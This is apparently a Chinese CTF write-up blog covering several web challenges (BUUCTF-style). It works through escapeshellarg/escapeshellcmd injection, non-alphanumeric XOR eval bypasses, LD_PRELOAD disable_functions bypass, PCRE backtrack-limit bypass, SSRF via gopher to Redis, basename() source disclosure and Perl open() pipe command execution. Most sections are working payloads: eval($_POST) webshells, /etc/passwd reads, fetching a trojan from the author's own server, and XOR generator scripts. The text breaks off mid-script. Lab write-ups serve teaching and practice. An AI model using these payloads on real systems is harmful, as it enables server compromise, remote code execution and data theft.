<p>先进过escapeshellarg 函数<br>变为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>\<span class="string">&#x27;&#x27;</span> <span class="meta">&lt;?=</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span> -oG flag.phtml<span class="string">&#x27;\&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">1</span></span><br></pre></td></tr></table></figure>
<p>再经过escapeshellcmd函数<br>变为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>\\<span class="string">&#x27;&#x27;</span> \&lt;\?= @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);\?\&gt; -oG flag.phtml<span class="string">&#x27;\\&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>可以发现单引号已经全部闭合</p>
<p>可以看成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\ <span class="meta">&lt;?=</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;hack&quot;</span>]);<span class="meta">?&gt;</span> -oG flag.phtml \\</span><br></pre></td></tr></table></figure>




<h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p><strong>无字母数字绕过</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>payload:</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$<span class="symbol">_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;$<span class="symbol">_</span>&#125;[<span class="symbol">_</span>]($&#123;$<span class="symbol">_</span>&#125;[<span class="symbol">__</span>]);&amp;<span class="symbol">_</span>=assert&amp;<span class="symbol">__</span>=<span class="built_in">eval</span>($_POST[a])</span><br></pre></td></tr></table></figure>
<p>蚁剑链接 无权限读取readflag </p>
<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank">bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>将github中一下两个文件 上传有有权限的目录，在这里选择/tmp</p>
<p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.php">bypass_disablefunc.php</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc_x64.so">bypass_disablefunc_x64.so</a></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;<span class="variable">$&#123;$_&#125;</span>[_](<span class="variable">$&#123;$_&#125;</span>[__]);&amp;_=assert&amp;__=var_dump(eval(<span class="variable">$_GET</span>[a]))&amp;a=include(<span class="string">&#x27;/tmp/bypass_disablefunc.php&#x27;</span>);&amp;cmd=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/readflag&amp;outpath=/</span>tmp<span class="regexp">/123.txt&amp;sopath=/</span>tmp/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>


<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p><strong>preg_match正则最大回溯绕过+换行绕过</strong></p>
<p>payload1:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;xxxxxx&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(url, data=&#123;<span class="string">&quot;cmd&quot;</span>:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
<p>payload2:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?c</span>md=&#123;%0A<span class="string">&quot;cmd&quot;</span><span class="symbol">:<span class="string">&quot;/bin/cat /home/rceservice/flag&quot;</span>%</span>0A&#125;</span><br></pre></td></tr></table></figure>
<p>这里cat的路径要写 /bin/cat是因为通过查看源代码：<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>，可以发现jail应用于当前环境，cat不在当前配置的环境变量中，需要我们自行写完整路径</p>
<p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank">use-pcre-backtrack-limit-to-bypass-restrict</a></p>
<h2 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h2><p><strong>SSRF 最基础的漏洞场景</strong></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.xxx.com<span class="regexp">/image.php?image=http:/</span><span class="regexp">/www.xxc.com/</span>a.jpg</span><br></pre></td></tr></table></figure>
<p>这样的链接就是有可能存在ssrf的,因为服务器有可能是向本机发起请求来获取相应的图片</p>
<p>倘若没有对image参数进行任何的检测,就可以构造其他的请求</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.xxx.com/image.php?image=http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">22</span></span><br><span class="line">http:<span class="regexp">//</span>www.xxx.com/image.php?image=file:<span class="regexp">//</span><span class="regexp">/etc/pass</span>wd</span><br><span class="line">http:<span class="regexp">//</span>www.xxx.com/image.php?image=dict:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">22</span>/data:data2 (dict可以向服务端口请求data data2)</span><br><span class="line">http:<span class="regexp">//</span>www.xxx.com/image.php?image=gopher:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">2233</span>/_test (向<span class="number">2233</span>端口发送数据test,同样可以发送POST请求)</span><br></pre></td></tr></table></figure>
<p>做题四步走：</p>
<ol>
<li>./?secret</li>
<li>用http协议配合bp进行内网主机探测</li>
<li>端口扫描，发现6379端口（redis），redis未授权访问的漏洞（通过传gopher在根目录下自动生成个文件shell.php）</li>
<li>gopherus制造shell</li>
</ol>
<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p><strong>知识点： basename()函数的使用</strong></p>
<blockquote>
<p>With the default locale setting “C”, basename() drops non-ASCII-chars at the beginning of a filename.</p>
</blockquote>
<p>该函数会去掉文件名开头的非ASCII值（%80 — %ff）</p>
<blockquote>
<p>var_dump(basename(“xffconfig.php”)); // =&gt; config.php var_dump(basename(“config.php/xff”)); // =&gt; config.php</p>
</blockquote>
<p>题目的关键代码其实只有上半部分</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>根据题目提示，flag在config.php文件中，通过<code>?source</code>读取<code>$_SERVER[&#39;PHP_SELF&#39;]</code>返回的是当前正在执行的脚本的名字比如说<code>basename(&quot;/path/home.php&quot;) -&gt; home.php</code>,</p>
<p><strong>当我访问index.php时，我可以在后面加上一些东西，比如/index.php/config.php，这样仍然访问的是index.php，但经过basename()后，传进highlight_file()函数的文件名就变成了config.php，如果能绕过那个正则，就可以得到config.php源码了，而$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用/index.php/config.php?source来读取flag。</strong></p>
<p>paylaod:</p>
<blockquote>
<p>/index.php/config.php/%80?source</p>
</blockquote>
<h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>完全考在了知识盲区，跟着wp复现了一遍</p>
<p>知识点：</p>
<ol>
<li><p> perl脚本中GET命令执行漏洞</p>
</li>
<li><p> file 协议利用 open 命令执行</p>
</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$http_x_headers</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);  <span class="comment">// explode(separator,string)函数把以separator为分隔字符串将字符串打散为数组。</span></span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$http_x_headers</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&quot;sandbox/&quot;</span> . md5(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);   <span class="comment">// “REMOTE_ADDR”为正在浏览当前页面用户的 IP 地址。 </span></span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    @chdir(<span class="variable">$sandbox</span>);     <span class="comment">// 改变当前的目录到$sandbox</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$data</span> = shell_exec(<span class="string">&quot;GET &quot;</span> . escapeshellarg(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]));     <span class="comment">// escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数</span></span><br><span class="line">    <span class="variable">$info</span> = pathinfo(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);  <span class="comment">// pathinfo() 函数以数组的形式返回文件路径的信息。</span></span><br><span class="line">    <span class="variable">$dir</span>  = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>, basename(<span class="variable">$info</span>[<span class="string">&quot;dirname&quot;</span>]));   <span class="comment">// basename() 函数返回路径中的文件名部分。</span></span><br><span class="line">    @mkdir(<span class="variable">$dir</span>);</span><br><span class="line">    @chdir(<span class="variable">$dir</span>);</span><br><span class="line">    @file_put_contents(basename(<span class="variable">$info</span>[<span class="string">&quot;basename&quot;</span>]), <span class="variable">$data</span>);</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="comment">// 以上代码大致为，调用GET（git）命令来执行从url获取的参数，从该url获取内容， 然后按照filename新建文件，写入git到的结果。</span></span><br></pre></td></tr></table></figure>
<p>根据源码可以发现php会对传过去的参数用escapeshellarg函数过滤。<strong>先创建一个目录sandbox/md5(orange+ip)，然后执行GIT $_GET[‘url’]，然后会创建文件夹，并将执行GIT $_GET[‘url’]后的结果放在该文件夹下面filename传过去的文件中。</strong></p>
<p><strong>如果GET后面跟路径的话，可以直接获取文件或目录内容</strong></p>
<blockquote>
<p>GET   /etc/passwd</p>
<p>GET   /      读取根目录</p>
</blockquote>
<p><strong>Perl语言的open函数</strong></p>
<blockquote>
<p>在Perl中可以用open或者sysopen函数来打开文件进行操作，这两个函数都需要通过一个文件句柄（即文件指针）来对文件进行读写定位等操作</p>
</blockquote>
<p>1：读：open(文件句柄，”&lt;文件名”)/open(文件句柄，”文件名”)，前提文件必须已经存在，否则会返回0，出错信息在$!中。<br>2：写：open(文件句柄，”&gt;文件名”)，文件如果不存在，那么创建之，如果存在，内容被清空，长度截为0，$!中有出错信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@npfs:~&#x2F;test# cat a.pl </span><br><span class="line">open(FD, &quot;|id&quot;);</span><br><span class="line">print &lt;FD&gt;;</span><br><span class="line">root@iZ285ei82c1Z:~&#x2F;test# perl a.pl </span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line"></span><br><span class="line">root@npfs:~&#x2F;test# cat test.pl </span><br><span class="line">open(FD, &quot;whoami|&quot;);</span><br><span class="line">print &lt;FD&gt;;</span><br><span class="line">root@iZ285ei82c1Z:~&#x2F;test# perl test.pl </span><br><span class="line">moxiaoxi</span><br></pre></td></tr></table></figure>


<p>当GET使用file协议的时候就会调用到perl的open函数</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Perl saw <span class="keyword">that</span> your “<span class="built_in">file</span>” ended <span class="keyword">with</span> a “pipe” (verticalbar) <span class="built_in">character</span>. So <span class="keyword">it</span> interpreted <span class="keyword">the</span> “<span class="built_in">file</span>” <span class="keyword">as</span> a command <span class="keyword">to</span> be executed, <span class="keyword">and</span> interpreted <span class="keyword">the</span> command’s output <span class="keyword">as</span> <span class="keyword">the</span> “<span class="built_in">file</span>”&#x27;s <span class="built_in">contents</span>. The command <span class="keyword">is</span> “who” (which prints information <span class="keyword">on</span> currently logged-<span class="keyword">in</span> users). If you execute <span class="keyword">that</span> command, you will see <span class="keyword">that</span> <span class="keyword">the</span> output <span class="keyword">is</span> exactly what <span class="keyword">the</span> Perl program gave you.</span><br><span class="line"></span><br><span class="line">翻译过来意思是：</span><br><span class="line">perl函数看到要打开的文件名中如果以管道符（键盘上那个竖杠）结尾，就会中断原有打开文件操作，并且把这个文件名当作一个命令来执行，并且将命令的执行结果作为这个文件的内容写入。这个命令的执行权限是当前的登录者。如果你执行这个命令，你会看到perl程序运行的结果。</span><br></pre></td></tr></table></figure>


<p><strong>perl脚本中GET命令执行漏洞：（前提是文档需要存在，若存在，才会触发最终的代码执行）</strong></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET ’file:id|<span class="string">&#x27;</span></span><br><span class="line"><span class="string">touch &#x27;</span>id|<span class="string">&#x27;</span></span><br><span class="line"><span class="string">GET ’file:id|&#x27;</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure>
<p><strong>在perl下，如果open的第二个参数（path）可控，我们就能进行任意代码执行。综合看起来像是一个把文件名拼接入命令导致的命令执行。</strong></p>
<p>payload:</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">首先得满足前面的文件存在, 才会继续到open语句, 所以在执行命令前得保证有相应的同名文件:</span><br><span class="line">?url=(任意)&amp;filename=bash -c <span class="regexp">/readflag| 先新建一个名为“bash -c /</span>readflag|”的文件</span><br><span class="line">?url=<span class="keyword">file</span>:bash -c <span class="regexp">/readflag|&amp;filename=aaa 再利用GET执行bash -c /</span>readflag保存到aaa文件</span><br><span class="line">访问sandbox<span class="regexp">/md5/</span>aaa（得到flag）</span><br></pre></td></tr></table></figure>


<p>其实如果对于这个open不理解的化=话还有更简单的做法，直接在自己的vps根目录下写一个木马文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>txt</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[a]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>将这个木马文件写入到自定义的123.php 中</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://ae1dea96-9018-4671-a599-2f80eeb7a409.node3.buuoj.cn/?url=http://xxx/1.txt&amp;filename=123.php">http://ae1dea96-9018-4671-a599-2f80eeb7a409.node3.buuoj.cn/?url=http://xxx/1.txt&amp;filename=123.php</a></p>
</blockquote>
<p>蚁剑连接即可</p>
<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><p>感觉挺复杂的一题</p>
<p><strong>知识点：</strong></p>
<p><strong>1.无数字字母shell</strong><br><strong>2.利用.htaccess上传文件</strong><br><strong>3.绕过open_basedir</strong></p>
<p>题目源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_the_flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// webadmin will remove your upload file every 20 min!!!! </span></span><br><span class="line">    <span class="variable">$userdir</span> = <span class="string">&quot;upload/tmp_&quot;</span>.md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!file_exists(<span class="variable">$userdir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$extension</span> = substr(<span class="variable">$name</span>, strrpos(<span class="variable">$name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>,<span class="variable">$extension</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="keyword">if</span>(mb_strpos(file_get_contents(<span class="variable">$tmp_name</span>), <span class="string">&#x27;&lt;?&#x27;</span>)!==<span class="literal">False</span>) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!exif_imagetype(<span class="variable">$tmp_name</span>)) <span class="keyword">die</span>(<span class="string">&quot;^_^&quot;</span>); </span><br><span class="line">        <span class="variable">$path</span>= <span class="variable">$userdir</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">        @move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="variable">$path</span>);</span><br><span class="line">        print_r(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hhh</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$hhh</span>)&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$hhh</span>)&gt;<span class="number">18</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;One inch long, one inch strong!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="variable">$hhh</span>) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Try something else!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$character_type</span> = count_chars(<span class="variable">$hhh</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$character_type</span>)&gt;<span class="number">12</span>) <span class="keyword">die</span>(<span class="string">&quot;Almost there!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$hhh</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>第一关</p>
<blockquote>
<p>首先判断是否从GET方法获取 “ _ “ 参数的值</p>
<p>然后通过 strlen() 函数对GET方法对该值进行长度检测 , 如果字符串长度大于 18 就拦截信息</p>
<p>接下来通过 preg_match() 正则过滤该值中的敏感字符 , 这个正则表达式非常严谨 , 过滤了绝大部分的可写字符</p>
<p>最后通过 count_chars() 函数来限制该值中不同字符的个数</p>
<p>很明显需要我们通过eval调用get_the_flag函数，然后上传bypass文件，最后拿到shell拿到flag。</p>
<p><strong>Payload : ${xxxx^xxxx}{x}();&amp;x= …</strong> , 转换后就变成了 <strong>$_GET[x]();&amp;x= …</strong></p>
</blockquote>
<p>放几个有用的脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//判断保留字</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, chr(<span class="variable">$i</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> chr(<span class="variable">$i</span>).<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//异或生成</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$l</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$r</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$argv</span> = str_split(<span class="string">&quot;_GET&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$argv</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">255</span>;<span class="variable">$j</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$k</span> = chr(<span class="variable">$j</span>)^chr(<span class="number">255</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$k</span> == <span class="variable">$argv</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                <span class="variable">$l</span> .= <span 